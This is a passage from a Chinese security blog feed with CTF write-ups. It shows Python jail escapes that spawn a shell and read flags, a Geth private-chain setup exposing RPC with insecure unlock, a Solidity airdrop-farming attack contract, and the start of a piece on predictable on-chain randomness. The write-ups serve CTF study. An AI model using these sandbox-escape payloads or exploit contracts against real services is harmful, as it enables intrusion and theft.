luck!<br></code></pre></td></tr></table></figure><p>第一种方法还是之前bytes被ban的情况。</p><p>另一中方法则是使用doc函数</p><p>但是由于+以及’被ban了可以先用join方法，然后用str()来绕过’</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28502</span><br><br>  _                _                           _       _ _   _                _ _  _   ___<br> | |              (_)                         (_)     (_) | | |              | | || | |__ \<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_   ) |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| / /<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ / /_<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;</span>,+ Good luck!<br>&gt; ().__class__.__base__.__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[<span class="hljs-built_in">str</span>().join([().__doc__[<span class="hljs-number">19</span>],().__doc__[<span class="hljs-number">86</span>],().__doc__[<span class="hljs-number">19</span>],().__doc__[<span class="hljs-number">4</span>],().__doc__[<span class="hljs-number">17</span>],().__doc__[<span class="hljs-number">10</span>]])](<span class="hljs-built_in">str</span>().join([().__doc__[<span class="hljs-number">19</span>],().__doc__[<span class="hljs-number">56</span>]]))<br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">flag_y0u_CaNt_FiNd_mE  server.py</span><br><span class="hljs-string">$ cat flag_y0u_CaNt_FiNd_mE</span><br><span class="hljs-string">flag=NSSCTF&#123;2ebbdbce-3567-4357-a156-0662bfbbf67c&#125;</span><br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level4-3"><a href="#calc-jail-beginner-level4-3" class="headerlink" title="calc_jail_beginner_level4.3"></a>calc_jail_beginner_level4.3</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28754</span><br><br>  _                _                           _       _ _   _                _ _  _   ____<br> | |              (_)                         (_)     (_) | | |              | | || | |___ \<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ &lt;<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,&quot;,&#x27;</span>,+ Good luck!<br>&gt;<br></code></pre></td></tr></table></figure><p>依然可以用上面的payload。</p><h4 id="CISCN-2023-初赛-pyshell"><a href="#CISCN-2023-初赛-pyshell" class="headerlink" title="[CISCN 2023 初赛]pyshell"></a>[CISCN 2023 初赛]pyshell</h4><p>有长度限制，使用’__’进行字符串拼接</p><p>python中_表示上次计算结果，因此可以进行_进行字符串拼接</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28841</span><br><br> __        ___             ____          ____            _<br> \ \      / / |__  _   _  / ___|  ___   / ___|  ___ _ __(_) ___  _   _ ___<br>  \ \ /\ / /| <span class="hljs-string">&#x27;_ \| | | | \___ \ / _ \  \___ \ / _ \ &#x27;</span>__| |/ _ \| | | / __|<br>   \ V  V / | | | | |_| |  ___) | (_) |  ___) |  __/ |  | | (_) | |_| \__ \<br>    \_/\_/  |_| |_|\__, | |____/ \___/  |____/ \___|_|  |_|\___/ \__,_|___/<br>                   |___/<br><br>        CISCN <span class="hljs-number">2023</span> Misc-Pyshell Rewriten by Randark_JMT<br><br>Welcome to this python shell,<span class="hljs-keyword">try</span> to find the flag!<br><br>&gt;&gt;<span class="hljs-string">&#x27;/flag&#x27;</span><br><span class="hljs-string">&#x27;/flag&#x27;</span><br>&gt;&gt;<span class="hljs-built_in">open</span>(_)<br> &lt;_io.TextIOWrapper name=<span class="hljs-string">&#x27;/flag&#x27;</span> mode=<span class="hljs-string">&#x27;r&#x27;</span> encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>&gt;<br>&gt;&gt;_.read<br> &lt;built-<span class="hljs-keyword">in</span> method read of _io.TextIOWrapper <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f6764267d30</span>&gt;<br>&gt;&gt;-()<br> Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: bad operand <span class="hljs-built_in">type</span> <span class="hljs-keyword">for</span> unary -: <span class="hljs-string">&#x27;tuple&#x27;</span><br>&gt;&gt;_()<br> <span class="hljs-string">&#x27;NSSCTF&#123;f78c6786-daf3-41a2-a6d8-a746d4c5b1d2&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GETH 搭建私链</title>
      <link href="/2023/10/24/GETH-%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE/"/>
      <url>/2023/10/24/GETH-%E6%90%AD%E5%BB%BA%E7%A7%81%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h3 id="1-下载客户端"><a href="#1-下载客户端" class="headerlink" title="1.下载客户端"></a>1.下载客户端</h3><p>在下载geth时，要注意版本不要太高，最新版本的geth不支持搭建私链。</p><p>这里是11.6版本。</p><h3 id="2-准备创世块的配置文件"><a href="#2-准备创世块的配置文件" class="headerlink" title="2.准备创世块的配置文件"></a>2.准备创世块的配置文件</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;chainId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;homesteadBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;byzantiumBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constantinopleBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;eip155Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;eip158Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;eip150Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;eip150Hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;coinbase&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;difficulty&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x20000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;extraData&quot;</span>  <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasLimit&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0xffffffff&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nonce&quot;</span>      <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000042&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mixhash&quot;</span>    <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;parentHash&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span>  <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x00&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;alloc&quot;</span>      <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="3-初始化写入创世区块"><a href="#3-初始化写入创世区块" class="headerlink" title="3.初始化写入创世区块"></a>3.初始化写入创世区块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs geth">geth init --datadir data1 genesis.json<br></code></pre></td></tr></table></figure><h3 id="4-启动geth"><a href="#4-启动geth" class="headerlink" title="4.启动geth"></a>4.启动geth</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">geth --datadir data1 --networkid <span class="hljs-number">10</span> --http --http.<span class="hljs-property">addr</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> --http.<span class="hljs-property">port</span> <span class="hljs-number">8545</span> --http.<span class="hljs-property">corsdomain</span> <span class="hljs-string">&quot;*&quot;</span> --http.<span class="hljs-property">api</span> <span class="hljs-string">&quot;db,eth,net,web3,personal,web3&quot;</span> --port <span class="hljs-number">30305</span> -allow-insecure-unlock <span class="hljs-variable language_">console</span> <span class="hljs-number">2</span>&gt;&gt;geth.<span class="hljs-property">log</span><br></code></pre></td></tr></table></figure><ol><li><strong>.&#x2F;geth</strong>：这是执行 Geth 客户端的命令。</li><li><strong>–datadir data1</strong>：这个选项指定了数据目录的路径，Geth 将在这个目录中存储区块链数据和相关文件。</li><li><strong>–networkid 10</strong>：指定私有链的网络标识符，这个值用于在不同私有链之间进行区分。</li><li><strong>–http</strong>：启用 HTTP-RPC 通信接口，允许通过 HTTP 请求与 Geth 进行交互。</li><li><strong>–http.addr 0.0.0.0</strong>：设置 HTTP-RPC 服务监听的地址，0.0.0.0 表示允许来自任何 IP 地址的连接。</li><li><strong>–http.port 8545</strong>：指定 HTTP-RPC 服务的端口号，一般是 8545。</li><li>**–http.corsdomain “*“*<em>：配置允许跨域请求的域名，设置为 “</em>“ 表示允许任何域名进行跨域请求。</li><li>**–http.api “db,eth,net,web3,personal,web3”**：指定启用的 HTTP-RPC 接口，这里列出了一些常用的接口，包括数据库、以太坊操作、网络信息、Web3 功能和个人账户操作。</li><li><strong>–port 30305</strong>：设置 Geth 节点的 P2P 网络端口，用于节点间的通信。</li><li><strong>-allow-insecure-unlock</strong>：允许以不安全的方式解锁账户。这在测试环境中使用，允许在 HTTP-RPC 上发送解锁账户的请求，但在生产环境中不建议使用</li></ol><p>web3.fromWei(eth.getBalance(eth.coinbase), “ether”);</p><h3 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h3><p><a href="https://www.bilibili.com/read/cv25915543/">一步步教程：使用Geth在本地搭建私有以太坊区块链 - 哔哩哔哩 (bilibili.com)</a></p><p><a href="https://www.cnblogs.com/shuhai165/p/16623128.html#autoid-0-0-0">Win10使用Geth客户端搭建以太坊私有链、连接可视化钱包 - 樹海 - 博客园 (cnblogs.com)</a></p><h3 id="web3的异常"><a href="#web3的异常" class="headerlink" title="web3的异常"></a>web3的异常</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\web3\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">from</span> eth_account <span class="hljs-keyword">import</span> Account  <span class="hljs-comment"># noqa: E402,</span><br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_account\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">from</span> eth_account.account <span class="hljs-keyword">import</span> (<br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_account\account.py&quot;</span>, line <span class="hljs-number">20</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">from</span> eth_keyfile <span class="hljs-keyword">import</span> (<br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_keyfile\__init__.py&quot;</span>, line <span class="hljs-number">7</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">from</span> eth_keyfile.keyfile <span class="hljs-keyword">import</span> (  <span class="hljs-comment"># noqa: F401</span><br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_keyfile\keyfile.py&quot;</span>, line <span class="hljs-number">11</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">from</span> eth_keys <span class="hljs-keyword">import</span> keys<br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_keys\__init__.py&quot;</span>, line <span class="hljs-number">15</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">from</span> .main <span class="hljs-keyword">import</span> (  <span class="hljs-comment"># noqa: F401</span><br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_keys\main.py&quot;</span>, line <span class="hljs-number">3</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">from</span> eth_utils <span class="hljs-keyword">import</span> (<br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_utils\__init__.py&quot;</span>, line <span class="hljs-number">86</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    <span class="hljs-keyword">from</span> .network <span class="hljs-keyword">import</span> (<br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_utils\network.py&quot;</span>, line <span class="hljs-number">49</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    networks = initialize_network_objects()<br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\site-packages\eth_utils\network.py&quot;</span>, line <span class="hljs-number">27</span>, <span class="hljs-keyword">in</span> initialize_network_objects<br>    network_data = json.load(open_file)<br>  File <span class="hljs-string">&quot;D:\python\Python310\lib\json\__init__.py&quot;</span>, line <span class="hljs-number">293</span>, <span class="hljs-keyword">in</span> load<br>    <span class="hljs-keyword">return</span> loads(fp.read(),<br>UnicodeDecodeError: <span class="hljs-string">&#x27;gbk&#x27;</span> codec can<span class="hljs-string">&#x27;t decode byte 0x88 in position 247555: illegal multibyte sequence</span><br></code></pre></td></tr></table></figure><p>解决方案</p><p><a href="https://blog.csdn.net/weixin_44322508/article/details/134130583">https://blog.csdn.net/weixin_44322508/article/details/134130583</a></p><h3 id="在线挖矿"><a href="#在线挖矿" class="headerlink" title="在线挖矿"></a>在线挖矿</h3><p><a href="http://www.snowywar.top/?golink=aHR0cHM6Ly9zZXBvbGlhLWZhdWNldC5wazkxMC5kZS8=">Sepolia PoW Faucet (pk910.de)</a></p><p><a href="http://www.snowywar.top/?golink=aHR0cHM6Ly9nb2VybGktZmF1Y2V0LnBrOTEwLmRlLw==">Goerli PoW Faucet (pk910.de)</a></p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Airdrop Hunting</title>
      <link href="/2023/10/24/Airdrop-Hunting/"/>
      <url>/2023/10/24/Airdrop-Hunting/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>薅羊毛攻击指使用多个不同的新账户来调用空投函数获得空投币并转账至攻击者账户以达到财富累计的一种攻击方式。这类攻击方式较为普通且常见，只要是有空投函数的合约都能够进行薅羊毛。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>数字经济大赛 2019 的 jojo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract jojo &#123;<br>    mapping(address =&gt; uint) public balanceOf;<br>    mapping(address =&gt; uint) public gift;<br>    address owner;<br><br>    constructor()public&#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    event SendFlag(string b64email);<br><br>    function payforflag(string b64email) public &#123;<br>        require(balanceOf[msg.sender] &gt;= 100000);<br>        emit SendFlag(b64email);<br>    &#125;<br><br>    function jojogame() payable&#123;<br>        uint geteth = msg.value / 1000000000000000000;<br>        balanceOf[msg.sender] += geteth;<br>    &#125;<br><br>    function gift() public &#123;<br>        assert(gift[msg.sender] == 0);<br>        balanceOf[msg.sender] += 100;<br>        gift[msg.sender] = 1;<br>    &#125;<br><br>    function transfer(address to,uint value) public&#123;<br>        assert(balanceOf[msg.sender] &gt;= value);<br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>分析如果想要出发flag函数需要余额&gt;&#x3D;100000； 而单单gift()函数一次只能增加余额100，所以可以创建1000个临时合约来调用空投函数，并进行转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.24;<br><br>contract jojo &#123;<br>    mapping(address =&gt; uint) public balanceOf;<br>    mapping(address =&gt; uint) public gift;<br>    address owner;<br>        <br>    constructor(address instance)public&#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    event SendFlag(string b64email);<br>    <br>    function payforflag(string b64email) public &#123;<br>        require(balanceOf[msg.sender] &gt;= 100000);<br>        emit SendFlag(b64email);<br>    &#125;<br>    <br>    function jojogame() payable&#123;<br>        uint geteth=msg.value/1000000000000000000;<br>        balanceOf[msg.sender]+=geteth;<br>    &#125;<br>    <br>    function gift() public &#123;<br>        assert(gift[msg.sender]==0);<br>        balanceOf[msg.sender]+=100;<br>        gift[msg.sender]=1;<br>    &#125;<br>    <br>    function transfer(address to,uint value) public&#123;<br>        assert(balanceOf[msg.sender] &gt;= value);<br>        balanceOf[msg.sender]-=value;<br>        balanceOf[to]+=value;<br>    &#125;<br>    <br>&#125;<br>contract Attack&#123;<br>   function attack(uint num)&#123;<br>    for(uint i=0;i&lt;num;i++)&#123;<br>        new Hack(this);<br>    &#125;<br>   &#125;<br>   function getflag(string email)public &#123;<br>    jojo target=jojo(0xD15e151C53bfbDcaf21f5FC849167c526c5A4572);<br>    target.payforflag(email);<br>   &#125;<br>&#125;<br><br>contract Hack&#123;<br>constructor(address target)&#123;<br>    jojo tem=jojo(0xD15e151C53bfbDcaf21f5FC849167c526c5A4572);<br>    tem.gift();<br>    tem.transfer(target,100);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Randomness</title>
      <link href="/2023/10/22/Randomness/"/>
      <url>/2023/10/22/Randomness/</url>
      
        <content type="html"><![CDATA[<h4 id="使用私有变量的伪随机数"><a href="#使用私有变量的伪随机数" class="headerlink" title="使用私有变量的伪随机数"></a>使用私有变量的伪随机数</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>合约使用外界未知的私有变量参与随机数生成。无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。我们可以使用区块链浏览器（如 etherscan）观察 storage 变动情况，或者计算变量储存的位置并使用 Web3 的 api 获得私有变量值，然后计算得到随机数。</p><h4 id="外部参与的随机数"><a href="#外部参与的随机数" class="headerlink" title="外部参与的随机数"></a>外部参与的随机数</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>随机数由其他服务端生成。为了确保公平，服务端会先将随机数或者其种子的哈希写入合约中，然后待用户操作之后再公布哈希对应的明文值。由于明文空间有 256 位，这样的随机数生成方法相对安全。但是在明文揭露时，我们可以在状态为 pending 的交易中找到明文数据，并以更高的 gas 抢在之前完成交易确认。</p><h4 id="使用区块变量的伪随机数"><a href="#使用区块变量的伪随机数" class="headerlink" title="使用区块变量的伪随机数"></a>使用区块变量的伪随机数</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>EVM 有五个字节码可以获取当前区块的变量，包括 coinbase、timestamp、number、difficulty、gaslimit。</p><p>我们也可以编写攻击合约，在攻击合约中获取到相同的区块变量值，进一步用相同的算法得到随机数值。</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br><br>import &#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;;<br><br>contract CoinFlip &#123;<br><br>  using SafeMath for uint256;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  function CoinFlip() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue.div(FACTOR);<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>代码处理流程为：<ul><li>获得上一块的 hash 值（    uint256 blockValue &#x3D; uint256(block.blockhash(block.number.sub(1)));）</li><li>判断与之前保存的 hash 值是否相等，相等则会退（if (lastHash &#x3D;&#x3D; blockValue) {revert();}）</li><li>根据 blockValue&#x2F;FACTOR 的值判断为正或负，即通过 hash 的首位判断（bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;）</li></ul></li></ul><p>如果使用可以被挖矿的矿工所控制的变量，如区块哈希值，时间戳，区块高低或是 Gas 上限等作为随机数的熵源，产生的随机数并不安全。</p><p>所以Attack</p><figure class="highlight plaintext"><table><tr><td 